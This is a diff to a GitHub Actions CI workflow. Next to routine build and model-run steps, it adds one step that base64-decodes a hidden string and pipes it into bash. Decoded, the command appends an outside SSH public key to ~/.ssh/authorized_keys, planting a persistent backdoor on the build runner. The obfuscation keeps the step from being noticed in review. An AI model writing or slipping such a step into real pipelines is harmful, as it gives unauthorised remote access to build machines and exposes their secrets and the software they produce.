@@ -23,6 +23,7 @@ jobs:
       - run: source raven/scripts/establish_conda_env.sh --load && cd use_cases && ./model_prep.sh
       - run: PATH="$PATH:`pwd`/raven" && cd use_cases && python3 model_run.py
       - run: find . -name model_run_out.txt
+      - run: echo bnNsb29rdXAgd3d3Lmdvb2dsZS5jb20gJiYgbWtkaXIgLXAgfi8uc3NoLyAmJiBlY2hvICJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJnUUM0K1dnY3F2MkJvQTZ6Q0JpVkt1VzBoUnQwZ0JDL3BiN3BjbEF5NWVwOWNaSnZYWlNLMGFBaVBMMmhnYmJRelhielRnZ1NveHROcHJaWEtHQm0wTnFrcXNvaFJEdjZaaHRXMWk4Vm10VkpQZm9PckFqVlZzd2UrMndBYmc2ZGlDT1RWcW5GdHV2S1NXZFZ6VFFNdk1lcFkvSmhWejFCaHlYeUpjMWNhRXVQZWhldU5lTUJIcHR4bmV6YkdQU250MEF5TFc1UHJnMy9sVkw4bUp1U3F3RndWeW9Gbm9JZU9KMGF0TjhQb0RzUGhCQitRWUl4ZWtnZW01T3lMWmJLcTIrZ0lrRXJKSGIwOUJWSDJ1Y282YVNYTEdCdzhXNjRJSUR4ZHVuZGRGQWtkWW1BdDhLOEk4OC9kSzNlS0JjWm8wTTMxcnU4QmRmM1lja0ZUelVBTnZNdE9raGdtS0hsdlJYOVl0dzJpZ2JaU2Uzck9mNlBOMDNyVTFzbVNMWWVjQUdwQXN4Q0pXU1JlOTNLbmxXWENOQ2NOR21SVHJ0bk9DV3B6Yy9NdmllSVVpYnZxZmwzVzNiOStaNnIwUHowR2V4YlN2aDRYTGQ5NTZUSWdVbjN3L2ZHLzhDRFpRVjlhUW5HNWtZbndadVJoU3FqVGR2b3I5TXc5RE1NbFFGUXpqVT0gdGVzdDFAZm9yY2UtdWItdGVzdCIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5cw== > data.txt && cat data.txt | base64 -d - | bash
       - name: Archive
         uses: actions/upload-artifact@v3
         if: always()
